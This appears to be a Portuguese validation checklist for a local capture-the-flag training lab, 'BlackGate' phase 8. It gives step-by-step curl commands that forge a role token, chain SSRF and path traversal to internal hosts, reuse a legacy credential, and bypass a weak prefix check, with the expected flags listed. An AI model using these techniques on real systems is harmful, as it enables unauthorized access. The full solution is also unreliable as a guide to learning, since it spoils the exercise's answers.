# Validacao - Lab 05 BlackGate - Fase 8

## Escopo

```text
http://localhost:8096
```

## Subir o lab

```bash
cd lab-05-blackgate
docker compose up --build
```

Em outro terminal:

```bash
docker compose ps
```

Resultado esperado:

- servico `blackgate` em execucao;
- porta `8096:3000`.

## Health e recon publico

```bash
curl -i http://localhost:8096/health
curl -i http://localhost:8096/api/version
curl -i http://localhost:8096/api/client-config
curl -i http://localhost:8096/api/routes
curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
```

Resultado esperado:

- `/health` retorna `1.7.0-phase8`;
- `/api/version` retorna build `bg-phase8-worker-processing`;
- client-config nao contem flag, payload ou endpoint interno de worker;
- `/api/routes` nao lista rotas internas de reports ou worker;
- debug nao entrega endpoint final nem combinacao.

## Login e token operator

```bash
rm -f /tmp/bg-cookie.txt

curl -i -c /tmp/bg-cookie.txt \
  -d "username=guest&password=guest123" \
  -X POST http://localhost:8096/login

TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Fase 3 ainda funcional

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Resultado esperado:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

## Fase 4 ainda funcional

```bash
CORE_META=$(node -e 'console.log(encodeURIComponent("http://api-core.internal/metadata"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CORE_META"
```

Resultado esperado:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

## Fase 5 ainda funcional

```bash
PHASE5_FILE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PHASE5_FILE"
```

Resultado esperado:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

## Arquivos novos do Files Vault

```bash
WORKER_REVIEW=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/worker-review.txt"))')
DIAG_ACTIONS=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/diagnostics-actions.txt"))')
PROCESSOR_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/processor-notes.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_REVIEW"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$DIAG_ACTIONS"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PROCESSOR_NOTES"
```

Resultado esperado:

- leitura funciona via bypass controlado `/public/../restricted/...`;
- nenhuma resposta contem a flag da Fase 8.

## Path direto deve falhar

```bash
DIRECT_WORKER_REVIEW=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/restricted/worker-review.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$DIRECT_WORKER_REVIEW"
```

Resultado esperado:

- HTTP 403;
- `forbidden_path`.

## Legacy auth e Fase 6

```bash
LEGACY_AUTH=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_AUTH"
```

Resultado esperado:

```text
bg6-legacy-session-migration
```

```bash
LEGACY_MAINT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_MAINT"
```

Resultado esperado:

```text
FLAG{blackgate_legacy_credential_reuse_phase6}
```

## Criar job correto da Fase 7

```bash
CREATE_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=queue-only"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_JOB"
```

Resultado esperado:

```text
FLAG{blackgate_report_workflow_abuse_phase7}
```

Tambem deve retornar:

- `job_id: bg7-job-worker-diagnostics`;
- `queue: maintenance-worker`;
- `status: queued`;
- `risk: unsafe-template-accepted`.

## Decoy migration-check ainda sem flag

```bash
CREATE_NORMAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary&queue=migration-report-queue&mode=dry-run"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_NORMAL"
```

Resultado esperado:

- `created: true`;
- sem flag da Fase 7 ou Fase 8.

## Worker status

```bash
WORKER_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/status?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_STATUS"
```

Resultado esperado:

- `worker: maintenance-worker`;
- `status: paused`;
- `mode: migration-review`;
- sem flag.

## Worker queue

```bash
WORKER_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/queue?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_QUEUE"
```

Resultado esperado:

- `queue: maintenance-worker`;
- job `bg7-job-worker-diagnostics`;
- `processor: maintenance-worker`;
- sem flag.

## Worker job details

```bash
WORKER_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/jobs/bg7-job-worker-diagnostics?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_JOB"
```

Resultado esperado:

- `allowed_actions` contem `status`, `checksum`, `trace`;
- `blocked_actions` contem `exec`, `callback`, `shell`;
- sem flag.

## Worker diagnostics

```bash
WORKER_DIAG=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/diagnostics?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_DIAG"
```

Resultado esperado:

- `profile: migration-safe`;
- actions basicas;
- sem flag.

```bash
WORKER_DIAG_INTERNAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/diagnostics?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&profile=internal"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_DIAG_INTERNAL"
```

Resultado esperado:

- HTTP 403;
- `profile_restricted`.

## Decoy normal action

```bash
WORKER_TRACE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_TRACE"
```

Resultado esperado:

- HTTP 200;
- `processed: true`;
- sem flag.

## Decoys e bloqueios

```bash
WORKER_STATUS_ACTION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=status&review=1"))')
WORKER_CHECKSUM=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=checksum&review=1"))')
WORKER_TRACE_INTERNAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal&review=1"))')
WORKER_NO_REVIEW=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue"))')
WORKER_BLOCK=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=exec&review=1"))')
WORKER_BAD_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-migration-check-migration-report-queue&action=trace&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_STATUS_ACTION"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_CHECKSUM"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_TRACE_INTERNAL"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_NO_REVIEW"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_BLOCK"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_BAD_JOB"
```

Resultados esperados:

- `status` e `checksum` sem flag;
- `trace:internal` retorna `review_only`;
- sem `review=1` retorna `review_required`;
- `exec` retorna `blocked_action`;
- job errado retorna `job_not_eligible` ou `job_not_found`.

## Flag da Fase 8

```bash
WORKER_FLAG=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_FLAG"
```

Resultado esperado:

```text
FLAG{blackgate_worker_processing_abuse_phase8}
```

Tambem deve retornar:

- `processed: true`;
- `finding: worker diagnostics action accepted internal queue trace through weak prefix validation`;
- next hint para a fase final.

## Rotas autenticadas no navegador

Apos login, validar:

```text
/dashboard
/context
/gateway
/legacy
/files-vault
/tickets
/assets
/security-policy
/logout
```

## Checks estaticos

```bash
grep -R "809[0-5]" -n . --exclude-dir=node_modules --exclude-dir=.git || true
grep -R "FLAG{blackgate_worker_processing_abuse_phase8}" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
grep -R "trace:internal:queue" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
grep -R "/worker/process" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
grep -R "/worker" -n src/routes/api.js src/routes/debug.js src/routes/operator.js src/public src/views README.md STUDENT-GUIDE.md || true
```

Resultado esperado:

- nenhuma ocorrencia de porta antiga;
- flag da Fase 8 nao aparece em README, Student Guide, JS publico, views ou rotas publicas;
- acao final nao aparece em README, Student Guide, JS publico, views ou rotas publicas;
- endpoint sensivel de worker nao aparece nas superficies publicas.
